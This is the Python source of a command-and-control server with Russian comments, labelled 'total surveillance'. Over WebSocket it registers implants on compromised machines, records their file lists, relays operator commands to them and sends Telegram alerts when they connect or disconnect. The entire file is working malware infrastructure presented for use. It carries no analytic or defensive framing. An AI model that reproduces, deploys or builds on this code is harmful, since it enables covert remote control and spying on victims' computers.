# --- Файл: c2_server.py (Версия 7.0 - ТОТАЛЬНОЕ ПРОСЛУШИВАНИЕ) ---
import asyncio
import json
import os
from aiohttp import web

# Убедись, что utils.py и settings.py на месте
from utils import send_telegram_message

# Глобальные переменные для хранения состояний
IMPLANTS, OPERATOR = {}, None

async def safe_send(ws, data):
    """Безопасно отправляет JSON, перехватывая ошибки отключения клиента."""
    if ws and not ws.closed:
        try:
            await ws.send_json(data)
            return True
        except (ConnectionResetError, asyncio.CancelledError):
            print(f"[SERVER-LOG] Не удалось отправить сообщение: клиент уже отключился.")
            return False
    return False

async def broadcast_bot_list():
    """Безопасно транслирует список ботов оператору."""
    print("[SERVER-LOG] Транслирую обновленный список ботов оператору...")
    await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()

    peername = request.transport.get_extra_info('peername')
    client_ip = peername[0] if peername else "Unknown IP"
    print("\n" + "="*20 + " НОВОЕ СОЕДИНЕНИЕ " + "="*20)
    print(f"[SERVER-LOG] Получен новый запрос на WebSocket от {client_ip}.")

    await ws.prepare(request)
    print(f"[SERVER-LOG] WebSocket handshake для {client_ip} завершен. Ожидаю идентификации...")

    client_type, client_id = None, None
    try:
        # Ожидаем первое сообщение для идентификации клиента
        initial_msg = await ws.receive_json(timeout=15.0)
        print(f"[SERVER-LOG] От {client_ip} получено первое сообщение: {initial_msg}")

        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            client_id = f"OPERATOR_{client_ip}"
            print(f"[+] Оператор {client_id} зарегистрирован.")
            await broadcast_bot_list()

        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id: raise ValueError("Имплант не предоставил ID")

            IMPLANTS[client_id] = {"ws": ws, "files": initial_msg.get('files', {}), "volume": initial_msg.get('current_volume', 50)}
            hostname = client_id.replace("implant_", "")
            print(f"[+] Имплант {hostname} ({client_ip}) зарегистрирован и добавлен в список.")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {hostname}")
            await broadcast_bot_list()
        else:
            raise ValueError(f"Неизвестный тип клиента: {client_type}")

        print(f"[SERVER-LOG] Клиент {client_id} успешно прошел идентификацию. Начинаю слушать сообщения...")
        # Основной цикл получения сообщений от клиента
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT and msg.data != 'pong':
                data = json.loads(msg.data)
                print(f"[SERVER-LOG] Получено сообщение от {client_id}: {data}")

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        print(f"[SERVER-LOG] Пересылаю команду {data['payload'].get('action')} боту {target_id}")
                        await safe_send(IMPLANTS[target_id]["ws"], data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                        await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': target_id, 'data': details})

                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except Exception as e:
        print(f"\n[!!! SERVER CRITICAL ERROR !!!] Ошибка в сессии с {client_id or client_ip}: {e.__class__.__name__} - {e}\n")

    finally:
        print("\n" + "-"*20 + " ОТКЛЮЧЕНИЕ " + "-"*20)
        print(f"[SERVER-LOG] Клиент {client_id or client_ip} отключается. Захожу в блок finally.")
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] Имплант {hostname} удален из списка.")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {hostname}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print(f"[-] Оператор {client_ip} отключился.")
        print(f"[SERVER-LOG] Процедура отключения для {client_id or client_ip} завершена.")
    return ws

async def http_handler(request):
    """Обработчик для отдачи веб-интерфейса."""
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    """Основная функция запуска сервера."""
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V7.0 TOTAL SURVEILLANCE) ONLINE ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nСервер остановлен.")
    finally:
        send_telegram_message("🛑 Сервер остановлен.")
